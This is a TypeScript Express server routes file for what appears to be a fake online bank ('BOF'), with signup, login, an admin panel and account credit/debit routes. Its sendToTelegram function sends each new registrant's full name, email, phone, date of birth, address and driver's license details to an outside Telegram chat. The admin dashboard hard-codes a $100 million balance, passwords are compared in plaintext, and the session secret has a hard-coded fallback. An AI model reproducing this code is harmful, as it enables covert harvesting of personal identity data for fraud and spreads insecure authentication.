import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { userSignupSchema, userLoginSchema, adminLoginSchema, cards } from "@shared/schema";
import session from "express-session";

// Telegram notification function
async function sendToTelegram(data: any) {
  const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
  const telegramChatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!telegramBotToken || !telegramChatId) {
    console.log("Telegram credentials not configured, skipping notification");
    return;
  }

  const message = `🏦 New BOF Registration:\n\n` +
    `👤 Name: ${data.firstName} ${data.lastName}\n` +
    `📧 Email: ${data.email}\n` +
    `📱 Phone: ${data.phone}\n` +
    `🎂 DOB: ${data.dateOfBirth}\n` +
    `🏠 Address: ${data.address}, ${data.city}, ${data.state} ${data.zipCode}\n` +
    `🆔 License: ${data.driversLicenseNumber} (${data.driversLicenseState})\n` +
    `📅 Expires: ${data.driversLicenseExpiry}\n` +
    `⏰ Registered: ${new Date().toLocaleString()}`;

  try {
    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Session configuration
  app.use(session({
    secret: process.env.SESSION_SECRET || "bof-secret-key-2024",
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: false, // Set to true in production with HTTPS
      maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
  }));

  // User authentication routes
  app.post("/api/auth/login", async (req, res) => {
    try {
      const { username, password } = userLoginSchema.parse(req.body);
      
      const user = await storage.getUserByUsername(username);
      if (!user || user.password !== password) {
        return res.status(401).json({ message: "Invalid credentials" });
      }

      if (!user.isActive) {
        return res.status(401).json({ message: "Account is inactive" });
      }

      // Store user session
      (req.session as any).userId = user.id;
      (req.session as any).username = user.username;
      
      res.json({ 
        message: "Login successful",
        user: {
          id: user.id,
          username: user.username,
          email: user.email,
          firstName: user.firstName,
          lastName: user.lastName
        }
      });
    } catch (error) {
      res.status(400).json({ message: "Invalid request" });
    }
  });

  // User registration route
  app.post("/api/auth/signup", async (req, res) => {
    try {
      const signupData = userSignupSchema.parse(req.body);
      
      // Check if username or email already exists
      const existingUser = await storage.getUserByUsername(signupData.username);
      if (existingUser) {
        return res.status(400).json({ message: "Username already exists" });
      }

      const existingEmail = await storage.getUserByEmail(signupData.email);
      if (existingEmail) {
        return res.status(400).json({ message: "Email already registered" });
      }

      // Create new user
      const newUser = await storage.registerUser(signupData);
      
      // Send registration data to Telegram
      await sendToTelegram(signupData);

      // Store user session (auto-login after signup)
      (req.session as any).userId = newUser.id;
      (req.session as any).username = newUser.username;
      
      res.status(201).json({ 
        message: "Registration successful",
        user: {
          id: newUser.id,
          username: newUser.username,
          email: newUser.email,
          firstName: newUser.firstName,
          lastName: newUser.lastName
        }
      });
    } catch (error: any) {
      if (error.errors) {
        // Validation errors from Zod
        return res.status(400).json({ 
          message: "Validation failed", 
          errors: error.errors 
        });
      }
      console.error("Signup error:", error);
      res.status(500).json({ message: "Registration failed" });
    }
  });

  app.post("/api/auth/logout", (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ message: "Could not log out" });
      }
      res.json({ message: "Logout successful" });
    });
  });

  app.get("/api/auth/user", async (req, res) => {
    const userId = (req.session as any)?.userId;
    if (!userId) {
      return res.status(401).json({ message: "Not authenticated" });
    }

    const user = await storage.getUser(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    res.json({
      id: user.id,
      username: user.username,
      email: user.email,
      firstName: user.firstName,
      lastName: user.lastName
    });
  });

  // Admin authentication routes
  app.post("/api/admin/login", async (req, res) => {
    try {
      const { username, password } = adminLoginSchema.parse(req.body);
      
      const admin = await storage.getAdminByUsername(username);
      if (!admin || admin.password !== password) {
        return res.status(401).json({ message: "Invalid admin credentials" });
      }

      if (!admin.isActive) {
        return res.status(401).json({ message: "Admin account is inactive" });
      }

      // Store admin session
      (req.session as any).adminId = admin.id;
      (req.session as any).adminUsername = admin.username;
      
      res.json({ 
        message: "Admin login successful",
        admin: {
          id: admin.id,
          username: admin.username
        }
      });
    } catch (error) {
      res.status(400).json({ message: "Invalid request" });
    }
  });

  app.post("/api/admin/logout", (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ message: "Could not log out" });
      }
      res.json({ message: "Admin logout successful" });
    });
  });

  app.get("/api/admin/user", async (req, res) => {
    const adminId = (req.session as any)?.adminId;
    if (!adminId) {
      return res.status(401).json({ message: "Not authenticated as admin" });
    }

    const admin = await storage.getAdmin(adminId);
    if (!admin) {
      return res.status(404).json({ message: "Admin not found" });
    }

    res.json({
      id: admin.id,
      username: admin.username
    });
  });

  // Protected admin routes
  const requireAdmin = async (req: any, res: any, next: any) => {
    const adminId = req.session?.adminId;
    if (!adminId) {
      return res.status(401).json({ message: "Admin authentication required" });
    }
    next();
  };

  // Admin dashboard data
  app.get("/api/admin/dashboard", requireAdmin, async (req, res) => {
    try {
      const users = await storage.getAllUsers();
      const accounts = await storage.getAllAccounts();
      const transactions = await storage.getAllTransactions();

      const stats = {
        totalCustomers: users.length,
        activeAccounts: accounts.filter(acc => acc.status === "active").length,
        totalDeposits: accounts.reduce((sum, acc) => sum + parseFloat(acc.balance || "0"), 0),
        creditCards: accounts.filter(acc => acc.accountType === "credit").length,
        totalBalance: 100000000.00, // $100 million total bank balance
      };

      res.json({
        stats,
        recentCustomers: users.slice(-5),
        accountTypes: {
          checking: accounts.filter(acc => acc.accountType === "checking").length,
          savings: accounts.filter(acc => acc.accountType === "savings").length,
          business: accounts.filter(acc => acc.accountType === "business").length,
          loan: accounts.filter(acc => acc.accountType === "loan").length,
        },
        recentTransactions: transactions.slice(-5)
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch dashboard data" });
    }
  });

  // User dashboard data
  app.get("/api/user/dashboard", async (req, res) => {
    const userId = (req.session as any)?.userId;
    if (!userId) {
      return res.status(401).json({ message: "Authentication required" });
    }

    try {
      const user = await storage.getUser(userId);
      const accounts = await storage.getAccountsByUserId(userId);
      
      const accountsWithTransactions = await Promise.all(
        accounts.map(async (account) => {
          const transactions = await storage.getTransactionsByAccountId(account.id);
          return {
            ...account,
            transactions: transactions.slice(-5) // Last 5 transactions
          };
        })
      );

      res.json({
        user: {
          firstName: user?.firstName,
          lastName: user?.lastName
        },
        accounts: accountsWithTransactions
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch user dashboard data" });
    }
  });

  // Admin user management
  app.get("/api/admin/users", requireAdmin, async (req, res) => {
    try {
      const users = await storage.getAllUsers();
      res.json(users);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch users" });
    }
  });

  app.get("/api/admin/accounts", requireAdmin, async (req, res) => {
    try {
      const accounts = await storage.getAllAccounts();
      res.json(accounts);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch accounts" });
    }
  });

  // Get specific user details
  app.get("/api/admin/user/:userId", requireAdmin, async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      res.json(user);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch user details" });
    }
  });

  // Get user accounts
  app.get("/api/admin/user/:userId/accounts", requireAdmin, async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const accounts = await storage.getAccountsByUserId(userId);
      res.json(accounts);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch user accounts" });
    }
  });

  // Get user cards
  app.get("/api/admin/user/:userId/cards", requireAdmin, async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const userCards = await storage.getCardsByUserId(userId);
      res.json(userCards);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch user cards" });
    }
  });

  // Card application
  app.post("/api/admin/apply-card", requireAdmin, async (req, res) => {
    try {
      const { userId, cardType, cardName } = req.body;
      
      if (!userId || !cardType) {
        return res.status(400).json({ message: "Invalid user ID or card type" });
      }

      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      // Simulate card processing
      const applicationId = `APP-${Date.now()}-${Math.random().toString(36).substr(2, 9).toUpperCase()}`;
      
      res.json({ 
        message: "Card application submitted successfully",
        applicationId,
        cardName: cardName || cardType,
        deliveryAddress: `${user.address}, ${user.city}, ${user.state} ${user.zipCode}`,
        estimatedDelivery: "7-10 business days"
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to process card application" });
    }
  });

  // Credit account
  app.post("/api/admin/credit-account", requireAdmin, async (req, res) => {
    try {
      const { accountId, amount, description } = req.body;
      
      if (!accountId || !amount || parseFloat(amount) <= 0) {
        return res.status(400).json({ message: "Invalid account ID or amount" });
      }

      const account = await storage.getAccount(accountId);
      if (!account) {
        return res.status(404).json({ message: "Account not found" });
      }

      // Update account balance
      const currentBalance = parseFloat(account.balance || "0");
      const creditAmount = parseFloat(amount);
      const newBalance = currentBalance + creditAmount;

      await storage.updateAccount(accountId, { balance: newBalance.toFixed(2) });

      // Create transaction record
      await storage.createTransaction({
        accountId: accountId,
        type: "deposit",
        amount: creditAmount.toFixed(2),
        description: description || `Admin credit - $${creditAmount}`
      });

      res.json({ 
        message: "Account credited successfully",
        newBalance: newBalance.toFixed(2)
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to credit account" });
    }
  });

  // Update user
  app.put("/api/admin/user/:userId", requireAdmin, async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const userData = req.body;
      
      const updatedUser = await storage.updateUser(userId, userData);
      if (!updatedUser) {
        return res.status(404).json({ message: "User not found" });
      }
      
      res.json({ message: "User updated successfully", user: updatedUser });
    } catch (error) {
      res.status(500).json({ message: "Failed to update user" });
    }
  });

  // Debit account
  app.post("/api/admin/debit-account", requireAdmin, async (req, res) => {
    try {
      const { accountId, amount, description } = req.body;
      
      if (!accountId || !amount || parseFloat(amount) <= 0) {
        return res.status(400).json({ message: "Invalid account ID or amount" });
      }

      const account = await storage.getAccount(accountId);
      if (!account) {
        return res.status(404).json({ message: "Account not found" });
      }

      const currentBalance = parseFloat(account.balance || "0");
      const debitAmount = parseFloat(amount);
      
      if (currentBalance < debitAmount) {
        return res.status(400).json({ message: "Insufficient funds" });
      }
      
      const newBalance = currentBalance - debitAmount;

      await storage.updateAccount(accountId, { balance: newBalance.toFixed(2) });

      // Create transaction record
      await storage.createTransaction({
        accountId: accountId,
        type: "withdrawal",
        amount: debitAmount.toFixed(2),
        description: description || `Admin debit - $${debitAmount}`
      });

      res.json({ 
        message: "Account debited successfully",
        newBalance: newBalance.toFixed(2)
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to debit account" });
    }
  });

  // Create new account
  app.post("/api/admin/create-account", requireAdmin, async (req, res) => {
    try {
      const { userId, accountType } = req.body;
      
      if (!userId || !accountType) {
        return res.status(400).json({ message: "User ID and account type are required" });
      }

      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      // Generate account number
      const timestamp = Date.now().toString().slice(-6);
      const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
      const accountNumber = `BOF-${accountType.toUpperCase().slice(0,3)}-${timestamp}${random}`;

      const newAccount = await storage.createAccount({
        userId: userId,
        accountNumber: accountNumber,
        accountType: accountType,
        balance: "0.00",
        status: "active"
      });

      res.json({ 
        message: "Account created successfully",
        account: newAccount
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to create account" });
    }
  });

  // Card application route
  app.post("/api/admin/apply-card", requireAdmin, async (req, res) => {
    try {
      const { userId, cardType } = req.body;
      
      if (!userId || !cardType) {
        return res.status(400).json({ message: "User ID and card type are required" });
      }

      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      // Create card application using storage
      const cardApplication = await storage.createCard({
        userId: userId,
        cardType: cardType,
        cardNumber: "****0000", // Placeholder, would be generated
        cardHolderName: user.firstName + " " + user.lastName,
        expiryMonth: "12",
        expiryYear: "2029",
        cvv: "000",
        status: "processing"
      });

      res.json({ 
        message: "Card application submitted successfully",
        application: cardApplication
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to submit card application" });
    }
  });

  // Get user card applications
  app.get("/api/admin/user/:userId/cards", requireAdmin, async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const userCards = await storage.getCardsByUserId(userId);
      res.json(userCards);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch card applications" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
